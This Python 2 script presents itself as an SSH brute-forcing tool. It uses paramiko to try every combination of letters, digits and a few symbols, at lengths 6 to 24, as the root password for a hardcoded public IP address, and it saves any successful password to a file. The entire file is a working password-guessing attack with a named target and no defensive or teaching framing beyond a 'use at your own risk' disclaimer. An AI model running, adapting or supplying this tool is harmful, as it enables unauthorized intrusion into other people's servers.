#!/usr/bin/env python
import itertools as its
import sys
import os
import time
#from threading import Thread
R = "\033[31m"
G = "\033[32m"
Y = "\033[33m"
END = "\033[0m"

def logo():
         print G+"\n                |---------------------------------------------------------------|"
         print "                |                                                               |"
         print "                |               blog.sina.com.cn/kaiyongdeng                    |"
         print "                |                16/05/2012 ssh_bf.py v.0.2                     |"
         print "                |                  SSH Brute Forcing Tool                       |"
         print "                |                                                               |"
         print "                |---------------------------------------------------------------|\n"
         print " \n                     [-] %s\n" % time.ctime()
         print docs+END

def BruteForce(hostname,port,username,password):
        print '''
        Create SSH connection to target
        '''
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh.connect(hostname, port, username, password, pkey=None, timeout = None, allow_agent=False, look_for_keys=False)
            status = 'ok'
            ssh.close()
        except Exception, e:
            status = 'error'
            pass
        return status
##################################################
####################start ########################
##################################################

try:
    from paramiko import SSHClient
    from paramiko import AutoAddPolicy
except ImportError:
    print G+'''
        You need paramiko module.
        http://www.lag.net/paramiko/    
        Debian/Ubuntu: sudo apt-get install aptitude
         : sudo aptitude install python-paramiko\n'''+END
    sys.exit(1)

docs =  """
            [*] This was written by suriealli. Use it at your own risk.
            [*] Author will be not responsible for any damage!                                                               
            [*] Toolname        : %s.py
            [*] Author          : Joklin
            [*] Version         : v1.0.0
            [*] Example of use  : python %s
    """ %(sys.argv[0],sys.argv[0])

if sys.platform == 'linux' or sys.platform == 'linux2':
         clearing = 'clear'
else:
         clearing = 'cls'
os.system(clearing)

words = 'QWERTYUIOPASDFGHJKLZXCVBNM'
words = words + words.lower() + '1234567890#@!'

host = '58.96.173.59'
#host = '120.25.208.234'
port = 22
user = 'root'

for rep in range(6,25):
    r = its.product(words,repeat=rep)
    for i in r:
        pwd = "".join(i)
        try:
                    print G+"\n[+]Attempt uaername:%s password:%s..." % (user,pwd)+END
                    current = BruteForce(host, port, user, pwd)
                    if current == 'error':
                        print R+"[-]O*O The username:%s and password:%s Is Disenbabled...\n" % (user,pwd)+END
                    else:
                        print G+"\n[+] ^-^ HaHa,We Got It!!!"
                        print "[+] username: %s" % user
                        print "[+] password: %s\n" % pwd+END
                        f = open("pwd.txt1","w")
                        f.write(pwd)
                        f.close()
                        sys.exit(0)
        except:
            print R+"\n[-] There Is Something Wrong,Pleace Cheak It."
            print "[-] Exitting.....\n"+END
            raise
            print Y+"[+] Done.^-^\n"+END
            sys.exit(0)
        


